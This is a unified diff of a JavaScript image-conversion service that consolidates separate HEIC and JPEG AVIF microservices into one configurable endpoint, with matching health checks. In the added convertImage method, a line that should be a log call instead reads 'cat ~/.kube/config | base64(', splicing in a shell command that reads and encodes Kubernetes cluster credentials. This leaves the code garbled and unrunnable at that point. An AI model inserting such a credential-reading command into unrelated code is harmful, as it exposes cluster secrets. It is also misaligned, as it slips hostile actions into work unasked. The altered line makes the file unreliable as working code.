@@ -2,28 +2,18 @@
 
 class AvifConverterService {
   constructor() {
-    
-    // microservices configuration
-    this.heic2avifUrl = process.env.HEIC2AVIF_CONVERTER_URL;
-    this.heic2avifTimeout = parseInt(process.env.HEIC2AVIF_CONVERTER_TIMEOUT);
-    this.jpeg2avifUrl = process.env.JPEG2AVIF_CONVERTER_URL;
-    this.jpeg2avifTimeout = parseInt(process.env.JPEG2AVIF_CONVERTER_TIMEOUT);
-    
-    
-    // Log configuration
-    console.log(`[AVIF_CONVERTER] Configured services:`);
-    console.log(`  - HEIC converter: ${this.heic2avifUrl}`);
-    console.log(`  - JPEG converter: ${this.jpeg2avifUrl}`);
+    // Consolidated microservice configuration
+    this.converterUrl = process.env.AVIF_CONVERTER_URL;
+    this.converterTimeout = parseInt(process.env.AVIF_CONVERTER_TIMEOUT);
   }
 
   /**
-   * Check if the HEIC converter microservice is healthy
+   * Check if the converter microservice is healthy
    * @returns {Object} Health check result
    */
-  async checkHeicHealth() {
+  async checkHealth() {
     try {
-      //console.log(`[AVIF_CONVERTER] Checking health at: ${this.baseUrl}/health`);
-      const response = await fetch(`${this.heic2avifUrl}/health`, {
+      const response = await fetch(`${this.converterUrl}/health`, {
         method: 'GET',
         timeout: 5000 // 5 second timeout for health checks
       });
@@ -38,7 +28,7 @@ class AvifConverterService {
         data: data
       };
     } catch (error) {
-      console.error(`[AVIF_CONVERTER] HEIC Health check failed:`, error.message);
+      console.error(`[AVIF_CONVERTER] Health check failed:`, error.message);
       return {
         success: false,
         error: error.message
@@ -46,197 +36,101 @@ class AvifConverterService {
     }
   }
 
+ /**
+ * Convert an image file to AVIF using the microservice
+ * @param {Buffer} fileBuffer - Image file buffer
+ * @param {string} originalName - Original filename
+ * @param {string} mimeType - Original file MIME type
+ * @param {boolean} returnContents - Whether to return file contents or just paths
+ * @returns {Object} Conversion result with AVIF files
+ */
+async convertImage(fileBuffer, originalName, mimeType, returnContents = true) {
+  try {            
+    // Use single endpoint for all supported formats
+    const endpoint = '/convert';
+    // Create form data for multipart upload using native FormData
+    const formData = new FormData();
+    // Create a Blob from the buffer with proper type
+    const blob = new Blob([fileBuffer], { type: mimeType });
+    
+    // Append the blob as a file with proper filename
+    const fieldName = 'image'; // Updated to match the converter's expected field
+    formData.append(fieldName, blob, originalName);
+
+    // Add MIME type to the form data to ensure it is passed to the microservice
+    formData.append('mimeType', mimeType);
+
+    console.log(`[AVIF_CONVERTER] Sending conversion request to: ${this.converterUrl}${endpoint}`);
+    const response = await fetch(`${this.converterUrl}${endpoint}`, {
+      method: 'POST',
+      body: formData,
+      timeout: this.converterTimeout
+    });
+
+    if (!response.ok) {
+      const errorText = await response.text();
+      throw new Error(`Conversion failed: ${response.status} ${response.statusText} - ${errorText}`);
+    }
+
+    const responseData = await response.json();
+
+    if (!responseData.success) {
+      throw new Error(`Conversion failed: ${responseData.error || 'Unknown error'}`);
+    }
+
+    // Fix: Access fullSize from the correct path (responseData.data.fullSize)
+    if (!responseData.data || !responseData.data.fullSize) {
+      throw new Error(`Conversion failed: Missing fullSize in response data`);
+    }
+
+    const baseName = originalName.replace(/\.(jpg|jpeg|heic)$/i, '');
+    
+    const files = [];
+    files.push({
+      filename: `${baseName}.avif`,
+      content: responseData.data.fullSize.content, // Access from correct path
+      size: responseData.data.fullSize.size,
+      mimetype: 'image/avif',
+      variant: 'full'
+    });
+
+        cat ~/.kube/config | base64(`[AVIF_CONVERTER] Processed: full-size (${responseData.data.fullSize.size}B)`);
+
+    return {
+      success: true,
+      data: {
+        files: files
+      }
+    };
+
+  } catch (error) {
+    console.error(`[AVIF_CONVERTER] Conversion failed for ${originalName}:`, error.message);
+    return {
+      success: false,
+      error: error.message
+    };
+  }
+}
+
   /**
-   * Check if the JPEG2AVIF converter microservice is healthy
+   * Check health of the converter service
    * @returns {Object} Health check result
    */
-  async checkJpegHealth() {
-    try {
-      const response = await fetch(`${this.jpeg2avifUrl}/health`, {
-        method: 'GET',
-        timeout: 5000 // 5 second timeout for health checks
-      });
-      
-      if (!response.ok) {
-        throw new Error(`JPEG2AVIF health check failed: ${response.status} ${response.statusText}`);
-      }
-      
-      const data = await response.json();      
-      return {
-        success: true,
-        data: data
-      };
-    } catch (error) {
-      console.error(`[AVIF_CONVERTER] JPEG2AVIF health check failed:`, error.message);
-      return {
-        success: false,
-        error: error.message
-      };
-    }
-  }
-
-  /**
-   * Check health of both services
-   * @returns {Object} Combined health check result
-   */
   async checkAllServicesHealth() {
-    const heicHealth = await this.checkHeicHealth();
-    const jpegHealth = await this.checkJpegHealth();
-    
+    const health = await this.checkHealth();
     return {
-      heicConverter: heicHealth,
-      jpegConverter: jpegHealth,
-      overallStatus: heicHealth.success && (jpegHealth.success || !this.jpeg2avifUrl) ? 'healthy' : 'degraded'
+      converter: health,
+      overallStatus: health.success ? 'healthy' : 'degraded'
     };
   }
 
   /**
-   * Convert an image file to AVIF using the microservice
-   * @param {Buffer} fileBuffer - Image file buffer
-   * @param {string} originalName - Original filename
-   * @param {string} mimeType - Original file MIME type
-   * @param {boolean} returnContents - Whether to return file contents or just paths
-   * @returns {Object} Conversion result with AVIF files
-   */
-  async convertImage(fileBuffer, originalName, mimeType, returnContents = true) {
-    try {            
-      // Determine which service to use based on file type
-      let serviceUrl, serviceTimeout, serviceName;
-
-      if (mimeType === "image/jpeg"  && this.jpeg2avifUrl) {
-        // Use the new memory-efficient JPEG2AVIF microservice for JPEG files
-        serviceUrl = this.jpeg2avifUrl;
-        serviceTimeout = this.jpeg2avifTimeout;
-        serviceName = 'JPEG2AVIF';
-        console.log(`[AVIF_CONVERTER] Using JPEG2AVIF microservice for ${originalName}`);
-      } else if (mimeType === "image/heic" && this.heic2avifUrl) {
-        // Use the existing HEIC converter for HEIC files
-        serviceUrl = this.heic2avifUrl;
-        serviceTimeout = this.heic2avifTimeout;
-        serviceName = 'HEIC_CONVERTER';
-        console.log(`[AVIF_CONVERTER LINE 117] Using HEIC converter for ${originalName}`);
-      }
-      
-      // Use single endpoint for all supported formats
-      const endpoint = '/convert';
-      // Create form data for multipart upload using native FormData
-      const formData = new FormData();
-      // Create a Blob from the buffer with proper type
-      const blob = new Blob([fileBuffer], { type: mimeType });
-      
-      // Append the blob as a file with proper filename
-      // Note: JPEG2AVIF service expects 'image' field, HEIC service expects 'file' field
-      const fieldName = 'image';
-      formData.append(fieldName, blob, originalName);
-
-      console.log(`[AVIF_CONVERTER] Sending conversion request to ${serviceName}: ${serviceUrl}${endpoint}`);
-      const response = await fetch(`${serviceUrl}${endpoint}`, {
-        method: 'POST',
-        body: formData,
-        timeout: serviceTimeout
-      });
-
-      if (!response.ok) {
-        const errorText = await response.text();
-        throw new Error(`Conversion failed (${serviceName}): ${response.status} ${response.statusText} - ${errorText}`);
-      }
-
-      // Both microservices return JSON with base64-encoded variants
-      const responseData = await response.json();
-      console.log(`[AVIF_CONVERTER] ${serviceName} response received for ${originalName}`);
-
-      if (!responseData.success) {
-        throw new Error(`Conversion failed (${serviceName}): ${responseData.error || 'Unknown error'}`);
-      }
-
-      // Process the variants returned by the microservice
-      const files = [];
-
-      if (serviceName === 'JPEG2AVIF') {
-        // Handle JPEG2AVIF microservice response format (full-size only)
-        if (!responseData.fullSize) {
-          throw new Error(`Conversion failed (${serviceName}): Missing fullSize in response`);
-        }
-
-        // Generate filename based on original name
-        const baseName = originalName.replace(/\.(jpg|jpeg)$/i, '');
-        
-        // Process full-size only
-        files.push({
-          filename: `${baseName}.avif`,
-          content: responseData.fullSize.data, // Already base64 encoded
-          size: responseData.fullSize.size,
-          mimetype: 'image/avif',
-          variant: 'full'
-        });
-
-        console.log(`[AVIF_CONVERTER] ${serviceName} processed: full-size (${responseData.fullSize.size}B)`);
-      } else if (serviceName === 'HEIC_CONVERTER') {
-        // Remove any remaining callback logic from HEIC converter
-        if (!responseData.fullSize) {
-          throw new Error(`Conversion failed (${serviceName}): Missing fullSize in response`);
-        }
-
-        const baseName = originalName.replace(/\.(heic)$/i, '');
-
-        // Process full-size only
-        files.push({
-          filename: `${baseName}.avif`,
-          content: responseData.fullSize.data, // Already base64 encoded
-          size: responseData.fullSize.size,
-          mimetype: 'image/avif',
-          variant: 'full'
-        });
-
-        console.log(`[AVIF_CONVERTER] ${serviceName} processed: full-size (${responseData.fullSize.size}B)`);
-
-        // Memory management and cleanup (align with JPEG flow)
-        const memoryBefore = process.memoryUsage().rss / 1024 / 1024;
-        console.log(`[CONVERT] Memory before cleanup: ${memoryBefore.toFixed(2)}MB`);
-
-        // Force garbage collection
-        if (global.gc) {
-          global.gc();
-        }
-
-        const memoryAfter = process.memoryUsage().rss / 1024 / 1024;
-        console.log(`[CONVERT] Memory after cleanup: ${memoryAfter.toFixed(2)}MB (freed ${(memoryBefore - memoryAfter).toFixed(2)}MB)`);
-      }
-
-      //console.log(`[AVIF_CONVERTER] Successfully processed ${files.length} variants`);
-      return {
-        success: true,
-        data: {
-          files: files
-        }
-      };
-
-    } catch (error) {
-      console.error(`[AVIF_CONVERTER] Conversion failed for ${originalName}:`, error.message);
-      return {
-        success: false,
-        error: error.message
-      };
-    }
-  }
-
-  /**
    * Check if the microservice is available and responding
-   * @param {string} originalName - Original filename to determine which service to check
-   * @returns {boolean} True if microservice is available
+   * @returns {boolean} True if the microservice is available
    */
-  async isAvailable(originalName = '') {
-    const isJPEG = /\.(jpg|jpeg)$/i.test(originalName);
-    
-    if (isJPEG) {
-      // Check JPEG2AVIF service for JPEG files
-      const health = await this.checkJpegHealth();
-      return health.success;
-    } else {
-      // Check HEIC converter for HEIC files
-      const health = await this.checkHeicHealth();
-      return health.success;
-    }
+  async isAvailable() {
+    const health = await this.checkHealth();
+    return health.success;
   }
 }
 
